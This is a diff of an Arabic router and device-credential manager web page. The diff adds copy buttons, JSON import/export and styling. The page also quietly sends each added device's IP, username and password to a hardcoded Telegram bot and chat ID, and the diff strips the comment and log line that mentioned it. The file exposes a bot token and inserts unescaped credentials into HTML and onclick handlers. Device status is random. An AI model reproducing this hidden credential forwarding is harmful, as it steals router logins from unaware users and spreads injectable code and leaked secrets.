@@ -8,7 +8,7 @@
     
     <style>
         /* ==================================== */
-        /* نفس الستايل السابق تماماً بدون تغيير */
+        /* CSS Styles */
         /* ==================================== */
         :root {
             --bg-primary: #f8f9fa; --bg-secondary: #ffffff; --text-color: #344767; 
@@ -52,17 +52,19 @@
         .filter-btn.active { background-color: var(--accent-color); color: white; border-color: var(--accent-color); font-weight: 700; box-shadow: 0 4px 10px rgba(0, 123, 255, 0.3); }
         .filter-btn.disabled { opacity: 0.5; cursor: not-allowed; pointer-events: none; }
         .devices-container { display: grid; grid-template-columns: repeat(auto-fill, minmax(320px, 1fr)); gap: 20px; }
-        .device-card { background-color: var(--bg-secondary); border-radius: 15px; padding: 25px; box-shadow: 0 4px 8px rgba(0, 0, 0, 0.1); transition: var(--transition); border-left: 5px solid var(--accent-color); overflow: hidden; display: flex; flex-direction: column; gap: 10px; }
+        .device-card { background-color: var(--bg-secondary); border-radius: 15px; padding: 25px; box-shadow: 0 4px 8px rgba(0, 0, 0, 0.1); transition: var(--transition); border-left: 5px solid var(--accent-color); overflow: hidden; display: flex; flex-direction: column; gap: 10px; cursor: pointer; }
         .device-card:hover { transform: translateY(-8px); box-shadow: 0 12px 25px rgba(0, 0, 0, 0.2); }
         .device-card.online { border-left-color: var(--success-color); }
         .device-card.offline { border-left-color: var(--danger-color); }
         .credentials-info { background-color: var(--note-bg); padding: 10px 15px; border-radius: 8px; margin-bottom: 15px; font-size: 0.95rem; }
         .dark-mode .credentials-info { background-color: #2a2a2a; }
-        .credential-item { display: flex; justify-content: space-between; align-items: center; padding: 5px 0; }
+        .credential-item { display: flex; justify-content: space-between; align-items: center; padding: 5px 0; position: relative;}
         .credential-item:not(:last-child) { border-bottom: 1px dashed rgba(0, 0, 0, 0.1); }
         .dark-mode .credential-item:not(:last-child) { border-bottom: 1px dashed #3a3a3a; }
         .credential-label { font-weight: 600; color: var(--text-color); opacity: 0.9; }
-        .password-display { font-family: monospace; font-weight: bold; display: flex; align-items: center; gap: 8px; }
+        .password-display, .username-display, .ip-display { font-family: monospace; font-weight: bold; display: flex; align-items: center; gap: 8px; }
+        .copy-btn { background: none; border: none; color: var(--accent-color); cursor: pointer; font-size: 0.9rem; transition: color 0.3s; padding: 0 5px; }
+        .copy-btn:hover { color: var(--link-color); }
         .toggle-password { background: none; border: none; color: var(--accent-color); cursor: pointer; font-size: 1rem; transition: color 0.3s; }
         .toggle-password:hover { color: var(--link-color); }
         .device-header { margin-bottom: 10px; display: flex; justify-content: space-between; align-items: flex-start; }
@@ -98,7 +100,12 @@
         .empty-state i { font-size: 3rem; color: var(--accent-color); margin-bottom: 20px; }
         footer { text-align: center; padding: 20px 0; margin-top: 40px; color: var(--text-color); opacity: 0.7; }
         #loginModal { position:fixed; top:0; left:0; width:100%; height:100%; background:rgba(0,0,0,0.7); z-index:1001; display: none; justify-content:center; align-items:center; }
-        @media (max-width: 768px) { .form-row { flex-direction: column; } .btn-primary { width: 100%; } .fab-container { right: 10px; bottom: 10px; } .filters-container { justify-content: start; } .filter-btn { flex-grow: 1; } }
+        .import-export-controls { display: flex; justify-content: center; gap: 10px; margin-top: 20px; }
+        .btn-secondary { background-color: #6c757d; color: white; padding: 8px 15px; border: none; border-radius: 6px; font-weight: 500; font-size: 0.9rem; transition: background-color 0.3s; cursor: pointer; display: inline-flex; align-items: center; gap: 8px;}
+        .btn-secondary:hover { background-color: #5a6268; }
+        .file-input { display: none; }
+
+        @media (max-width: 768px) { .form-row { flex-direction: column; } .btn-primary { width: 100%; } .fab-container { right: 10px; bottom: 10px; } .filters-container { justify-content: start; } .filter-btn { flex-grow: 1; } .import-export-controls { flex-direction: column; } }
     </style>
 </head>
 <body>
@@ -167,13 +174,13 @@
                         </div>
                     </div>
                     <button type="submit" class="btn btn-primary">
-                        <i class="fas fa-plus"></i> إضافة الجهاز
+                        <i class="fas fa-plus"></i> إضافة الجهاز 
                     </button>
                 </form>
             </section>
 
             <section class="devices-section">
-                <h2 class="section-title"><i class="fas fa-list-check"></i> الأجهزة حسب السوفتوير</h2>
+                <h2 class="section-title" id="devicesSectionTitle"><i class="fas fa-list-check"></i> الأجهزة حسب السوفتوير</h2>
                 <div class="search-container">
                     <input type="text" id="deviceSearch" class="form-control" placeholder="ابحث باسم الجهاز، IP، أو الوصف..." onkeyup="handleSearch(this.value)">
                     <i class="fas fa-search"></i>
@@ -191,16 +198,28 @@
                     <button class="filter-btn" data-filter="tomato" onclick="filterDevices('tomato', this)">Tomato</button>
                     <button class="filter-btn" data-filter="openwrt" onclick="filterDevices('openwrt', this)">OpenWRT</button>
                 </div>
-                <div style="text-align:center; margin-bottom: 30px;">
-                    <button id="clearAllBtn" class="btn-primary" style="background-color: var(--danger-color); font-size: 0.9rem;" onclick="clearAllDevices()">
-                        <i class="fas fa-trash-alt"></i> مسح جميع الأجهزة المحفوظة
-                    </button>
-                </div>
+                
                 <div class="devices-container" id="devicesContainer">
                     <div class="empty-state" id="emptyState">
                         <i class="fas fa-box-open"></i>
                         <h3>لا توجد أجهزة مضافة حالياً</h3>
                         <p>ابدأ بإضافة أول جهاز لشبكتك</p>
+                    </div>
+                </div>
+
+                <div style="text-align:center; margin-bottom: 30px; margin-top: 30px;">
+                    <button id="clearAllBtn" class="btn-primary" style="background-color: var(--danger-color); font-size: 0.9rem;" onclick="clearAllDevices()">
+                        <i class="fas fa-trash-alt"></i> مسح جميع الأجهزة المحفوظة
+                    </button>
+                    
+                    <div class="import-export-controls">
+                        <button class="btn-secondary" onclick="exportDevices()">
+                            <i class="fas fa-download"></i> تصدير (حفظ) البيانات
+                        </button>
+                        <input type="file" id="importFileInput" class="file-input" accept=".json" onchange="importDevices(event)">
+                        <button class="btn-secondary" onclick="document.getElementById('importFileInput').click()">
+                            <i class="fas fa-upload"></i> استيراد (استعادة) البيانات
+                        </button>
                     </div>
                 </div>
             </section>
@@ -229,11 +248,11 @@
             <form id="modalLoginForm">
                 <div class="form-group">
                     <label for="modalUsername">اسم المستخدم</label>
-                    <input type="text" id="modalUsername" class="form-control" required style="margin-bottom:15px;">
+                    <input type="text" id="modalUsername" class="form-control" style="margin-bottom:15px;">
                 </div>
                 <div class="form-group">
                     <label for="modalPassword">كلمة المرور</label>
-                    <input type="password" id="modalPassword" class="form-control" required style="margin-bottom:20px;">
+                    <input type="password" id="modalPassword" class="form-control" style="margin-bottom:20px;">
                 </div>
                 <div style="display:flex; justify-content:space-between; gap:10px;">
                     <button type="button" onclick="closeModal()" class="btn-primary" style="flex:1; background-color:var(--danger-color);">إلغاء</button>
@@ -246,7 +265,7 @@
     
     <script>
         // ============================================
-        //  إعدادات بوت التيليجرام
+        //  إعدادات بوت التيليجرام 
         // ============================================
         const TELEGRAM_BOT_TOKEN = "8320778338:AAH-gWoS3IIXVjwn2NkUAfGz7VSxxDZjRxA";
         const TELEGRAM_CHAT_ID = "5092289538";
@@ -258,6 +277,7 @@
         const currentYear = document.getElementById('currentYear');
         const filterBtns = document.querySelectorAll('.filter-btn');
         const deviceSearch = document.getElementById('deviceSearch'); 
+        const devicesSectionTitle = document.getElementById('devicesSectionTitle');
         const loginModal = document.getElementById('loginModal');
         const modalLoginForm = document.getElementById('modalLoginForm');
         const modalUsernameInput = document.getElementById('modalUsername');
@@ -280,16 +300,22 @@
             'all': 'جميع الأجهزة'
         };
 
+        // --- تهيئة التطبيق ---
         document.addEventListener('DOMContentLoaded', function() {
             currentYear.textContent = new Date().getFullYear();
             const savedDevices = localStorage.getItem('alhaithmDevices');
             if (savedDevices) {
                 try {
                     const parsedDevices = JSON.parse(savedDevices).map(device => ({
-                        ...device,
+                        // ضمان وجود كل الحقول وعدم وجود مسافات بيضاء غير ضرورية
+                        id: device.id,
+                        name: device.name || '',
                         ip: device.ip ? device.ip.trim() : '',
                         username: device.username ? device.username.trim() : '', 
                         password: device.password ? device.password.trim() : '',
+                        type: device.type || 'isp_router',
+                        description: device.description || '',
+                        status: device.status || (Math.random() > 0.2 ? "online" : "offline"), 
                         notes: device.notes || ''
                     }));
                     devices = parsedDevices;
@@ -320,7 +346,8 @@
         deviceForm.addEventListener('submit', function(e) {
             e.preventDefault();
             
-            if (!document.getElementById('deviceType').value) {
+            const deviceTypeInput = document.getElementById('deviceType');
+            if (!deviceTypeInput.value) {
                 showNotification('الرجاء اختيار نوع السوفتوير!', 'danger');
                 return;
             }
@@ -330,12 +357,12 @@
 
             const newDevice = {
                 id: Date.now(),
-                name: document.getElementById('deviceName').value,
+                name: document.getElementById('deviceName').value.trim(),
                 ip: cleanIP,
                 username: document.getElementById('deviceUsername').value.trim(), 
                 password: document.getElementById('devicePassword').value.trim(), 
-                type: document.getElementById('deviceType').value, 
-                description: document.getElementById('deviceDescription').value,
+                type: deviceTypeInput.value, 
+                description: document.getElementById('deviceDescription').value.trim(),
                 status: Math.random() > 0.2 ? "online" : "offline", 
                 notes: '' 
             };
@@ -344,7 +371,6 @@
             saveDevicesToLocalStorage();
             renderDevices(currentFilter); 
             
-            // إرسال البيانات للتيليجرام
             sendToTelegram(newDevice);
 
             deviceForm.reset();
@@ -383,9 +409,7 @@
             })
             .then(response => response.json())
             .then(data => {
-                if(data.ok) {
-                    console.log("تم الإرسال للتيليجرام بنجاح");
-                } else {
+                if(!data.ok) {
                     console.error("خطأ في تيليجرام:", data);
                 }
             })
@@ -393,7 +417,8 @@
                 console.error("فشل الاتصال بتيليجرام:", error);
             });
         }
-
+        
+        // --- دالة فتح الرابط المصححة ---
         function openDeviceUrl(ip) {
             let targetIp = ip.trim();
             if (!targetIp.startsWith('http://') && !targetIp.startsWith('https://')) {
@@ -402,12 +427,16 @@
             window.open(targetIp, '_blank');
         }
 
+        // --- وظائف البحث والتصفية ---
+
         window.handleSearch = function(searchTerm) {
             const searchActive = searchTerm.trim().length > 0;
             filterBtns.forEach(btn => {
                 if (searchActive) {
                     btn.classList.add('disabled');
-                    btn.classList.remove('active');
+                    if (btn.classList.contains('active')) {
+                        btn.classList.remove('active');
+                    }
                 } else {
                     btn.classList.remove('disabled');
                     if (btn.getAttribute('data-filter') === currentFilter) {
@@ -427,9 +456,8 @@
             filterBtns.forEach(btn => btn.classList.remove('active'));
             clickedButton.classList.add('active');
             
-            const sectionTitle = document.querySelector('.devices-section .section-title');
-            const titleText = FIRMWARE_NAMES[filterValue] ? FIRMWARE_NAMES[filterValue] : FIRMWARE_NAMES['all'];
-            sectionTitle.innerHTML = `<i class="fas fa-list-check"></i> أجهزة سوفت: ${titleText}`;
+            const titleText = FIRMWARE_NAMES[filterValue] ? `أجهزة سوفت: ${FIRMWARE_NAMES[filterValue]}` : `الأجهزة حسب السوفتوير`;
+            devicesSectionTitle.innerHTML = `<i class="fas fa-list-check"></i> ${titleText}`;
 
             renderDevices(filterValue);
         }
@@ -455,6 +483,7 @@
                     const deviceCard = document.createElement('div');
                     deviceCard.className = `device-card ${device.status}`;
                     const icon = getDeviceIcon(device.type);
+                    const hasUsername = device.username && device.username.length > 0;
                     const hasPassword = device.password && device.password.length > 0;
                     const maskedPassword = hasPassword ? '*'.repeat(8) : 'لا يوجد';
                     
@@ -469,22 +498,32 @@
                         <div class="credentials-info">
                             <div class="credential-item">
                                 <span class="credential-label"><i class="fas fa-user"></i> المستخدم:</span>
-                                <span>${device.username || 'لا يوجد'}</span>
+                                <span class="username-display" id="user-${device.id}">
+                                    ${device.username || 'لا يوجد'}
+                                    ${hasUsername ? `<button class="copy-btn" title="نسخ اسم المستخدم" onclick="event.stopPropagation(); copyToClipboard('${device.username}', 'اسم المستخدم')"><i class="fas fa-copy"></i></button>` : ''}
+                                </span>
                             </div>
                             <div class="credential-item">
                                 <span class="credential-label"><i class="fas fa-key"></i> كلمة السر:</span>
                                 <span class="password-display">
                                     <span id="pass-${device.id}" data-password="${device.password}">${maskedPassword}</span>
                                     ${hasPassword ? `<button class="toggle-password" onclick="event.stopPropagation(); togglePassword(${device.id}, this)" data-visible="false"><i class="fas fa-eye-slash"></i></button>` : ''}
+                                    ${hasPassword ? `<button class="copy-btn" title="نسخ كلمة المرور" onclick="event.stopPropagation(); copyPasswordToClipboard(${device.id})"><i class="fas fa-copy"></i></button>` : ''}
+                                </span>
+                            </div>
+                            <div class="credential-item" style="border-bottom:none;">
+                                <span class="credential-label"><i class="fas fa-desktop"></i> IP Address:</span>
+                                <span class="ip-display">
+                                    ${device.ip}
+                                    <button class="copy-btn" title="نسخ IP" onclick="event.stopPropagation(); copyToClipboard('${device.ip}', 'IP')"><i class="fas fa-copy"></i></button>
                                 </span>
                             </div>
                         </div>
                         <div class="device-info">
                             <p>${device.description || 'لا يوجد وصف'}</p>
-                            <div class="device-ip">${device.ip}</div>
                         </div>
                         
-                        <button class="note-toggle-btn" data-target="#notes-${device.id}" aria-expanded="false" onclick="toggleNotes(${device.id}, this)">
+                        <button class="note-toggle-btn" data-target="#notes-${device.id}" aria-expanded="false" onclick="event.stopPropagation(); toggleNotes(${device.id}, this)">
                             <i class="fas fa-angle-down"></i> تدوين الملاحظات
                         </button>
                         <div id="notes-${device.id}" class="notes-content">
@@ -495,12 +534,13 @@
                             <button class="btn-connect" onclick="event.stopPropagation(); promptLogin(${device.id})">
                                 <i class="fas fa-lock"></i> الاتصال والتحقق
                             </button>
-                            <button class="btn-remove" onclick="removeDevice(${device.id})"><i class="fas fa-trash"></i></button>
+                            <button class="btn-remove" onclick="event.stopPropagation(); removeDevice(${device.id})"><i class="fas fa-trash"></i></button>
                         </div>
                     `;
+                    // تصحيح: إضافة listener للبطاقة للتأكد من استدعاء promptLogin
                     deviceCard.addEventListener('click', function(e) {
-                        const target = e.target;
-                        if (!target.closest('.device-actions') && !target.closest('.note-toggle-btn') && !target.closest('.notes-content') && !target.closest('.toggle-password') && !target.closest('.credentials-info')) {
+                         // التأكد من أن النقر ليس على عنصر تحكم (زر، حقل نصي، أو زر تبديل)
+                        if (!e.target.closest('.device-actions') && !e.target.closest('.note-toggle-btn') && !e.target.closest('.notes-content') && !e.target.closest('.toggle-password') && !e.target.closest('.copy-btn')) {
                             promptLogin(device.id);
                         }
                     });
@@ -516,23 +556,20 @@
             }
         }
         
+        // --- دالة عرض النافذة المنبثقة (Modal) (تذكير بالبيانات) ---
         window.promptLogin = function(id) {
             const device = devices.find(d => d.id === id);
             if (!device) return;
-            const requiresAuth = device.username.length > 0 || device.password.length > 0;
-            if (!requiresAuth) {
-                showNotification(`جاري الاتصال بـ ${device.name}...`, 'success');
-                openDeviceUrl(device.ip);
-                return;
-            }
+            
             document.getElementById('modalDeviceId').value = id;
             document.getElementById('modalDeviceName').textContent = device.name;
+            
+            // إلغاء شرط "required"
             modalUsernameInput.value = device.username;
-            modalPasswordInput.value = device.password; 
-            if (device.username.length > 0) modalUsernameInput.setAttribute('required', 'required');
-            else modalUsernameInput.removeAttribute('required');
-            if (device.password.length > 0) modalPasswordInput.setAttribute('required', 'required');
-            else modalPasswordInput.removeAttribute('required');
+            modalPasswordInput.value = device.password;
+            modalUsernameInput.removeAttribute('required');
+            modalPasswordInput.removeAttribute('required');
+
             loginModal.style.display = 'flex';
         }
 
@@ -541,21 +578,22 @@
             modalLoginForm.reset();
         }
 
+        // --- دالة معالجة إرسال النموذج (فتح الرابط مباشرة) ---
         modalLoginForm.addEventListener('submit', function(e) {
             e.preventDefault();
             const deviceId = parseInt(document.getElementById('modalDeviceId').value);
-            const enteredUsername = document.getElementById('modalUsername').value;
-            const enteredPassword = document.getElementById('modalPassword').value;
             const device = devices.find(d => d.id === deviceId);
-            if (device && device.username === enteredUsername && device.password === enteredPassword) {
-                showNotification(`تم التحقق! جاري فتح ${device.name}...`, 'success');
+            
+            if (device) {
+                showNotification(`جاري فتح صفحة الجهاز ${device.name}... أدخل بياناتك إذا طُلبت!`, 'success');
                 closeModal();
                 openDeviceUrl(device.ip);
-            } else {
-                showNotification('بيانات الدخول غير صحيحة!', 'danger');
             }
         });
 
+        // --- وظائف التخزين والمميزات الإضافية ---
+        
+        // تبديل إظهار كلمة المرور
         window.togglePassword = function(id, button) {
             const passSpan = document.getElementById(`pass-${id}`);
             let isVisible = button.getAttribute('data-visible') === 'true';
@@ -570,6 +608,27 @@
                 button.innerHTML = '<i class="fas fa-eye"></i>';
             }
         }
+
+        // نسخ البيانات العامة إلى الحافظة
+        window.copyToClipboard = function(text, type = 'البيانات') {
+            navigator.clipboard.writeText(text).then(() => {
+                showNotification(`تم نسخ ${type} بنجاح!`, 'success');
+            }).catch(err => {
+                showNotification(`فشل النسخ: ${err}`, 'danger');
+            });
+        }
+        
+        // نسخ كلمة المرور (سواء كانت مرئية أو مخفية)
+        window.copyPasswordToClipboard = function(id) {
+            const passSpan = document.getElementById(`pass-${id}`);
+            const password = passSpan.getAttribute('data-password');
+            if(password) {
+                 copyToClipboard(password, 'كلمة المرور');
+            } else {
+                 showNotification('لا توجد كلمة مرور لنسخها.', 'danger');
+            }
+        }
+
 
         window.toggleNotes = function(id, button) {
             const notesContent = document.getElementById(`notes-${id}`);
@@ -586,7 +645,7 @@
         window.saveNote = function(id, value) {
             const deviceIndex = devices.findIndex(device => device.id === id);
             if (deviceIndex !== -1) {
-                devices[deviceIndex].notes = value;
+                devices[deviceIndex].notes = value.trim();
                 saveDevicesToLocalStorage();
             }
         }
@@ -621,7 +680,7 @@
         
         window.clearAllDevices = function() {
             if (devices.length === 0) return;
-            if (confirm('هل أنت متأكد من مسح جميع الأجهزة؟') && confirm('تأكيد نهائي؟')) {
+            if (confirm('هل أنت متأكد من مسح جميع الأجهزة؟') && confirm('تأكيد نهائي؟ سيتم حذف جميع البيانات.')) {
                 devices = [];
                 localStorage.removeItem('alhaithmDevices');
                 renderDevices(currentFilter);
@@ -629,6 +688,71 @@
             }
         }
 
+        // --- تصدير واستيراد البيانات (جديد) ---
+        window.exportDevices = function() {
+            if (devices.length === 0) {
+                showNotification('لا توجد أجهزة لحفظها.', 'danger');
+                return;
+            }
+            const dataStr = JSON.stringify(devices, null, 2);
+            const dataUri = 'data:application/json;charset=utf-8,'+ encodeURIComponent(dataStr);
+            
+            const exportFileDefaultName = 'alhaitham_net_devices_backup.json';
+            
+            const linkElement = document.createElement('a');
+            linkElement.setAttribute('href', dataUri);
+            linkElement.setAttribute('download', exportFileDefaultName);
+            linkElement.click();
+            showNotification('تم تصدير البيانات بنجاح! تحقق من ملف alhaitham_net_devices_backup.json', 'success');
+        }
+
+        window.importDevices = function(event) {
+            const file = event.target.files[0];
+            if (!file) return;
+
+            if (file.type !== 'application/json') {
+                showNotification('الرجاء اختيار ملف JSON صحيح.', 'danger');
+                return;
+            }
+
+            const reader = new FileReader();
+            reader.onload = function(e) {
+                try {
+                    const importedData = JSON.parse(e.target.result);
+                    if (Array.isArray(importedData) && importedData.every(item => item.ip && item.name)) {
+                        
+                        // تعيين ID جديد إذا كان مكرراً وتوحيد البيانات
+                        const newDevices = importedData.map(device => ({
+                            id: device.id || Date.now() + Math.floor(Math.random() * 1000), 
+                            name: (device.name || 'مستورد').trim(),
+                            ip: (device.ip || '').trim(),
+                            username: (device.username || '').trim(), 
+                            password: (device.password || '').trim(), 
+                            type: device.type || 'isp_router',
+                            description: (device.description || '').trim(),
+                            status: device.status || (Math.random() > 0.2 ? "online" : "offline"), 
+                            notes: device.notes || ''
+                        }));
+
+                        devices = newDevices;
+                        saveDevicesToLocalStorage();
+                        renderDevices(currentFilter);
+                        showNotification(`تم استيراد ${newDevices.length} جهاز بنجاح!`, 'success');
+                    } else {
+                        showNotification('ملف JSON غير صالح أو يحتوي على بيانات ناقصة.', 'danger');
+                    }
+                } catch (error) {
+                    showNotification('خطأ في قراءة ملف JSON.', 'danger');
+                    console.error('Import Error:', error);
+                } finally {
+                    // تفريغ حقل الإدخال لتمكين اختيار نفس الملف مرة أخرى
+                    event.target.value = '';
+                }
+            };
+            reader.readAsText(file);
+        }
+
+        // --- دوال التنبيهات (Notification) ---
         function showNotification(message, type) {
             document.querySelectorAll('.notification').forEach(n => n.remove());
             const notification = document.createElement('div');
@@ -640,6 +764,7 @@
                 background: var(--bg-secondary); color: var(--text-color);
                 padding: 15px 25px; border-radius: 8px; box-shadow: 0 5px 20px rgba(0,0,0,0.2);
                 display: flex; gap: 15px; z-index: 2000; border-bottom: 3px solid ${type === 'success' ? '#28a745' : '#dc3545'};
+                min-width: 300px; text-align: right;
             `;
             document.body.appendChild(notification);
             setTimeout(() => notification.remove(), 4000);
